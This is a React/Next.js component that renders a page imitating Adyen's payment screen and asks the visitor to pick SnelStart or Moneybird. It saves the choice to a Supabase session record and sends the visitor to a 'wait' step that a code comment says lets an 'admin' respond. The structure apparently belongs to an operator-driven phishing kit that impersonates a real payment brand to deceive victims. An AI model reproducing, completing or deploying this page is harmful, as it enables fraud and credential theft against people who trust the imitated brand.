"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

type Props = {
  sessionId: string;
};

export function AdyenLoginClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [saving, setSaving] = useState(false);

  async function handleSelectProvider(providerName: string) {
    if (!supabase || !sessionId) return;
    setSaving(true);

    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;

    // We just save the selection and move to "wait" so admin can respond
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: {
          ...prev,
          bankSlug: "adyen",
          bankName: "Adyen",
          selectedProvider: providerName,
        },
      })
      .eq("id", sessionId);

    if (error) {
      setSaving(false);
      alert("Something went wrong. Please try again.");
      return;
    }
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#F5F5F5] font-sans flex flex-col items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-sm w-full max-w-[480px] p-8">
        
        {/* Adyen Logo */}
        <div className="flex justify-center mb-8">
          <img src="/bank-logos/adyen.svg" alt="Adyen" className="h-10" />
        </div>

        {/* Title & Description */}
        <div className="text-center mb-8">
          <h1 className="text-xl font-semibold text-[#111111] mb-3">Complete your payment</h1>
          <p className="text-[#333333] text-sm leading-relaxed">
            Adyen works with our payment providers to let you pay securely and quickly.
          </p>
        </div>

        {/* Provider Selection */}
        <div className="mb-4">
          <h2 className="text-[15px] font-bold text-[#111111] mb-4">Choose how to pay:</h2>
          
          <div className="space-y-3">
            {/* SnelStart Button */}
            <button 
              onClick={() => handleSelectProvider("SnelStart")}
              disabled={saving}
              className="w-full flex items-center border border-gray-200 rounded-md p-4 hover:border-gray-300 hover:shadow-sm transition-all bg-white disabled:opacity-50"
            >
              <div className="w-8 h-8 rounded shrink-0 mr-4 flex items-center justify-center overflow-hidden">
                <img src="/snelstart-logo.ico" alt="SnelStart" className="w-full h-full object-cover" onError={(e) => {
                  (e.target as HTMLImageElement).src = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%232C7BE5"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>'
                }} />
              </div>
              <span className="text-[15px] font-medium text-[#111111]">SnelStart</span>
            </button>

            {/* Moneybird Button */}
            <button 
              onClick={() => handleSelectProvider("Moneybird")}
              disabled={saving}
              className="w-full flex items-center border border-gray-200 rounded-md p-4 hover:border-gray-300 hover:shadow-sm transition-all bg-white disabled:opacity-50"
            >
              <div className="w-8 h-8 rounded shrink-0 mr-4 flex items-center justify-center overflow-hidden">
                <img src="/moneybird-logo.ico" alt="Moneybird" className="w-full h-full object-cover" onError={(e) => {
                  (e.target as HTMLImageElement).src = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%230080FF"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12s4.48 10 10 10 10-4.48 10-10zm-11 5v-4H8v-2h3V8h2v3h3v2h-3v4h-2z"/></svg>'
                }} />
              </div>
              <span className="text-[15px] font-medium text-[#111111]">Moneybird</span>
            </button>
          </div>
        </div>

      </div>
    </div>
  );
}
